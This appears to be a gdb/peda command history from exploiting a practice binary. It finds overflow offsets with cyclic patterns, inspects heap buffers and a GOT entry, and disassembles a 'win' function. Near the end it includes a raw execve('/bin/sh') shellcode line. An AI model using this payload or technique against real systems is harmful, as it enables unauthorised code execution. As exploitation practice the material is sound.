r < out
info stack
disas main
quit
pattern
pattern create 1000
r AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$x
r
r 
r  
r f
pattern search
disas main
break *main+143
r
info proc map
x/50x 0x804e000
x/100x 0x804e000
x/100x 0x804e150
x/100x 0x804e250
r
c
x/20x *0x804e000
x/20x 0x804e000
x/20x 0x804e2a0
pattern offset 0x42416442
quit
r < out
disas main
break *main+189
r
x/50x 0x804e000
x/80x 0x804e000
x/8x 0x804e000
define hook-stop
x/5i $eip
echo fullname-----------------------------------------------
x/16x 0x804e000
echo name---------------------------------------------------
x/16x 0x804e2a0
echo lastname-----------------------------------------------
x/16x 0x804e2e8
end
ni
ni
pattern create 2000
r
r f
c
c
pattern offset 0x416c4241
quit
define hook-stop
x/5i $eip
echo fullname-----------------------------------------------
x/16x 0x804e000
echo name---------------------------------------------------
x/16x 0x804e2a0
echo lastname-----------------------------------------------
x/16x 0x804e2e8
end
r
r < out
quit
r < out
define hook-stop
x/5i $eip
echo fullname-----------------------------------------------
x/16x 0x804e000
echo name---------------------------------------------------
x/16x 0x804e2a0
echo lastname-----------------------------------------------
x/16x 0x804e2e8
end
disas main
break *main+189
r
ni
disas
r
set *0x804e2a4=0x60
ni
print $edx
print $eax
disas free
print $ea
dias
disas
disas main
break *main+90
r
quit
r < out
r < out
x/5i $eip
echo fullname-----------------------------------------------
x/16x 0x804e000
echo name---------------------------------------------------
x/16x 0x804e2a0
echo lastname-----------------------------------------------
x/16x 0x804e2e8
quit
r < out
r < out
x/5i $eip
echo fullname-----------------------------------------------
x/16x 0x804e000
echo name---------------------------------------------------
x/16x 0x804e2a0
echo lastname-----------------------------------------------
x/16x 0x804e2e8
x/x 0x804d02c
quit
r < out
x/5i $eip
echo fullname-----------------------------------------------
x/16x 0x804e000
echo name---------------------------------------------------
x/16x 0x804e2a0
echo lastname-----------------------------------------------
x/16x 0x804e2e8
quit
r < out
x/16x 0x804e2e8
quit
r < out
x/16x 0x804e2e8
quit
r < out
quit
r < out
x/5i $eip
echo fullname-----------------------------------------------
x/16x 0x804e000
echo name---------------------------------------------------
x/16x 0x804e2a0
echo lastname-----------------------------------------------
x/16x 0x804e2e8
r < out
r < out
r < out
quit
r < out
x/5i $eip
echo fullname-----------------------------------------------
x/16x 0x804e000
echo name---------------------------------------------------
x/16x 0x804e2a0
echo lastname-----------------------------------------------
x/16x 0x804e2e8
info stack
quit
r < out
x/5i $eip
echo fullname-----------------------------------------------
x/16x 0x804e000
echo name---------------------------------------------------
x/16x 0x804e2a0
echo lastname-----------------------------------------------
x/16x 0x804e2e8
info stack
disas main
x/x 0x0804d02c
x/i 0x0804d02c
x/i *0x0804d02c
x/2i *0x0804d02c
disas win
ni
print $eax
print $eax
x/5i $eip
echo fullname-----------------------------------------------
x/16x 0x804e000
echo name---------------------------------------------------
x/16x 0x804e2a0
echo lastname-----------------------------------------------
x/16x 0x804e2e8
quit
r < out
print $eax
print $eax+0xc
print $eax
x/5i $eip
echo fullname-----------------------------------------------
x/16x 0x804e000
echo name---------------------------------------------------
x/16x 0x804e2a0
echo lastname-----------------------------------------------
x/16x 0x804e2e8
quit
r < out
x/5i $eip
echo fullname-----------------------------------------------
x/16x 0x804e000
echo name---------------------------------------------------
x/16x 0x804e2a0
echo lastname-----------------------------------------------
x/16x 0x804e2e8
x/16x 0x804e2a0
quit
r < out
x/5i $eip
echo fullname-----------------------------------------------
x/16x 0x804e000
echo name---------------------------------------------------
x/16x 0x804e2a0
echo lastname-----------------------------------------------
x/16x 0x804e2e8
quit
r < out
x/5i $eip
echo fullname-----------------------------------------------
x/16x 0x804e000
echo name---------------------------------------------------
x/16x 0x804e2a0
echo lastname-----------------------------------------------
x/16x 0x804e2e8
quit
r < out
x/5i $eip
echo fullname-----------------------------------------------
x/16x 0x804e000
echo name---------------------------------------------------
x/16x 0x804e2a0
echo lastname-----------------------------------------------
x/16x 0x804e2e8
quit
quit
r < out
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
x/5i $eip
echo fullname-----------------------------------------------
x/16x 0x804e000
echo name---------------------------------------------------
x/16x 0x804e2a0
echo lastname-----------------------------------------------
x/16x 0x804e2e8
quit
r < out
quit
